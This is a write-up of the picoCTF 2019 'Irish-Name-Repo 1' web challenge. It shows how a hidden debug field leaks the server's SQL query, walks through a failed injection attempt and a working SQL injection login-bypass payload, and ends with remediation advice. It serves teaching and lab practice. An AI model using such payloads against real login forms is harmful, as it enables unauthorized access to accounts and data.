# Irish-Name-Repo 1 — Writeup

## Information
- Platform: CyLab Security Academy / picoCTF 2019
- Category: Web Exploitation
- Difficulty: Medium
- Challenge author: Chris Hensler

## Challenge description
The challenge presents a showcase website ("List 'o the Irish!") and asks you to find a way to log in as an administrator.

## Initial analysis
Inspecting the homepage's source code reveals an "Admin Login" link pointing to `login.html`. The two hints provided explicitly point toward a user database and the login verification mechanism, suggesting a server-side flaw rather than a simple interface error.

The source code of `login.html` reveals a POST form to `login.php`, with two visible fields (`username`, `password`) and an interesting hidden field:

```html
<input type="hidden" name="debug" value="0">
```

## Identifying the vulnerability
By changing the value of the hidden `debug` field from `0` to `1` via DevTools, the page displays the raw SQL query executed by the server before the login fails:

```sql
SELECT * FROM users WHERE name='test' AND password='test'
```

This information leak confirms two essential points: the real column name (`name`, not `username`) and the total absence of input sanitization in the SQL query. The `username` field is concatenated directly into the `WHERE` clause, opening the door to a classic SQL injection.

## Exploitation

### Attempt 1 (failure)
```text
username: ' OR '1'='1
password: test
```

Generated query:
```sql
SELECT * FROM users WHERE name='' OR '1'='1' AND password='test'
```

Expected failure: in SQL, the `AND` operator has higher precedence than `OR`. The query is therefore interpreted as `name='' OR ('1'='1' AND password='test')`, which remains false since no user has the password `test`.

### Attempt 2 (success)
```text
username: ' OR '1'='1'-- 
password: test
```

Generated query:
```sql
SELECT * FROM users WHERE name='' OR '1'='1'-- ' AND password='test'
```

The SQL comment marker `-- ` (with a trailing space) neutralizes everything that follows, including the password check. Only the condition `'1'='1'`, always true, is evaluated: authentication is bypassed.

## Retrieving the flag
In line with picoCTF/CyLab rules (flags are dynamically generated per instance, and should not be shared in plaintext as a community best practice):

```text
picoCTF{*************************}
```

## What this demonstrates
This flaw illustrates a classic SQL injection authentication bypass, made worse by an information leak through a debug mode left active in production.

## Fix
- Use parameterized queries (prepared statements) to strictly separate user data from SQL structure.
- Remove any debug mode or diagnostic field before production deployment.
- Apply the principle of least privilege to the database account used by the application.
